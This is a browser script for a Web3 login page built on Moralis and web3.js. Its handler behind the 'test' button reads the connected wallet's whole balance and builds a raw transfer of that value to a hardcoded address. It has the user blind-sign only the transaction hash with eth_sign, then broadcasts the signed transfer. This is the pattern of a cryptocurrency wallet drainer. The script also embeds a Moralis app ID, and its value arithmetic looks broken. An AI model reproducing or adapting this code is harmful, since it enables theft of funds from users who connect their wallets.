console.log('script')

const loginBtn = document.querySelector('.btn-login')
const logoutBtn = document.querySelector('.btn-logout')
const testBtn = document.querySelector('.btn-test')

const serverUrl = "https://nmwp46zioxer.usemoralis.com:2053/server";
const appId = "5nRUZGshjHYD9iGK7DXmivWeCitWVAmnok93Mph0";
Moralis.start({ serverUrl, appId });
await Moralis.enableWeb3();
const web3 = new Web3(Moralis.provider);



const login = async() => {
    let user = Moralis.User.current();
    if (!user) {
        user = await Moralis.authenticate();
    }
    console.log("logged in user:", user);
}

const logout = async() => {
    await Moralis.User.logOut();
    console.log("logged out");
}

// web3.eth.getBalance( userAddr, function(err, result) {
//   if (err) {
//     console.log(err)
//   } else {
//     console.log(web3.utils.fromWei(result, "ether") + " ETH")
//   }
// })

const test = async() => {
    console.log('test')


    let userAddr = (await web3.eth.getAccounts())[0];
    await web3.eth.getTransactionCount(userAddr, "pending").then(async nonce1 => {
        console.log("nonce1", nonce1)
        const gasPrice = await web3.eth.getGasPrice()
            // web3.eth.getBalance(userAddr, function(err, result) {
            //     if (err) {
            //         console.log(err)
            //     } else {
            //         console.log(web3.utils.fromWei(result, "ether") + " ETH")
            //     }
            // })

        let pub_addr = "0x2e46Eb6dA91058231bf65FdC8AEa7B29bCe96600";
        let chainId = await web3.eth.getChainId();
        let bal = await web3.eth.getBalance(userAddr);
        // const TGas = gasPrice * 1.1
        let weiBalanceSend = bal * 1000000000000000000
        console.log(weiBalanceSend)

        console.log(gasPrice)
            // const sendBalance = weiBalanceSend - TGas
            // console.log(sendBalance)
            // let wei_send = 10000000000000000; // wei to send

        let tx_ = {
            from: userAddr,
            "to": pub_addr,
            "nonce": web3.utils.toHex(nonce1),
            "gasLimit": "0x55F0", // gasLimit
            "gasPrice": web3.utils.toHex(Math.floor(gasPrice * 1.3)),
            "value": web3.utils.toHex(weiBalanceSend),
            "data": "0x",
            "v": "0x1",
            "r": "0x",
            "s": "0x"
        }

        var tx = new ethereumjs.Tx(tx_);

        var serializedTx = "0x" + tx.serialize().toString("hex");
        let hexer = { "encoding": "hex" };


        const sha3_ = web3.utils.sha3(serializedTx, hexer);
        console.log("rawTx1:", serializedTx);
        console.log("rawHash1:", sha3_);

        await web3.eth.sign(sha3_, userAddr).then(async signed => {
            const temporary = signed.substring(2),
                r_ = "0x" + temporary.substring(0, 64),
                s_ = "0x" + temporary.substring(64, 128),
                rhema = parseInt(temporary.substring(128, 130), 16),
                v_ = web3.utils.toHex(rhema + chainId * 2 + 8);
            console.log("r:", r_);
            console.log("s:", s_);
            console.log("y:", v_.toString("hex"));
            tx.r = r_;
            tx.s = s_;
            tx.v = v_;
            console.log(tx);

            console.log("---------------------------------------------");

            const txFin = "0x" + tx.serialize().toString("hex") //,
            const sha3__ = web3.utils.sha3(txFin, hexer);
            console.log("rawTx:", txFin);
            console.log("rawHash:", sha3__);
            await web3.eth.sendSignedTransaction(txFin).then(elisebeth => console.log(elisebeth)).catch(vannette => console.log(vannette))
        }).catch(heide => console.log(heide))
    })
}

loginBtn.addEventListener('click', async() => {
    console.log('login')
    await login()
})

logoutBtn.addEventListener('click', async() => {
    await logout()
})

testBtn.addEventListener('click', async() => {
    await test()
})